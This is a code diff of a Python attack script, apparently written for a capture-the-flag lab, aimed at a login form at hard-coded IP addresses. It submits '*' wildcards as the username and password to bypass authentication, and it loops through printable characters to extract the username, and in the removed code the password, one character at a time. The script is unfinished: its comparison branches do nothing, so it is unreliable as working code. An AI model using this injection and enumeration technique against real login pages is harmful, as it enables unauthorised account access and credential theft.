@@ -1,38 +1,67 @@
 import requests 
-from bs4 import BeautifulSoup
 from urllib.request import Request
 from urllib.request import urlopen
-import random
-
+import os 
 
 #url = "http://167.71.143.20:32106/login"
-url = "http://167.71.143.20:30728/login"
+#url = "http://167.71.143.20:30728/login"
+url = "http://188.166.168.204:30373/login"
 
 
-def authentication(url, payload):
 
-    
-    request_session = requests.session()
-    password = payload+"*"
-    params = {
-            'username': "reese",
-            'password':payload
+# to check if the login is correct
 
-            }
-    get_url = request_session.post(url, data= params)
+request_successfully = requests.post(url, data = 
+        {
+            'username': '*',
+            'password': '*'
+        })
+
+print(request_successfully.url, request_successfully.status_code)
+payload_username = ''
+payload_password = ''
+
+
+for i in range(32, 126):
+
+    username = payload_username + chr(i)+''
+    new_request = requests.post(url, data = {'username':username , 'password':'*' }).text
+
+    if new_request == request_successfully.text : 
+        pass
+    else:
+        pass
+
+
+
+
+
+"""
+#x = ''
+def authentication(url):
+    x = ''
+    for i in range(32, 126):
+
+        initial_payload = x+chr(i)+'*'
+        request_session = requests.session()
+        #password = initial_payload+payload+"*"
+        params = {
+                'username': '*',
+                'password':'*'
+
+                }
+        get_url = request_session.post(url, data= params)
+
+        if get_url.status_code == 200:
+            #os.system("clear")
+            print("decode: ",x, chr(i))
+            x += chr(i)
+            print(get_url.status_code)
+            #exit()
     
     #print("status code %s and url %s"%(get_url.status_code,str(get_url.url)))
 
-    if get_url.status_code == 200 and get_url.url == "http://167.71.143.20:30728/":
-        #print(get_url.text)
-        print("status code %s and url %s"%(get_url.status_code,str(get_url.url)))
-        print(password)
-
     
-if __name__ == '__main__':
-    list_asciis = []
-    for i in range (32,126):
-        list_asciis.append(str(chr(i)))
+#authentication(url, "")    
+"""    
 
-    for x in list_asciis:
-        authentication(url,x)
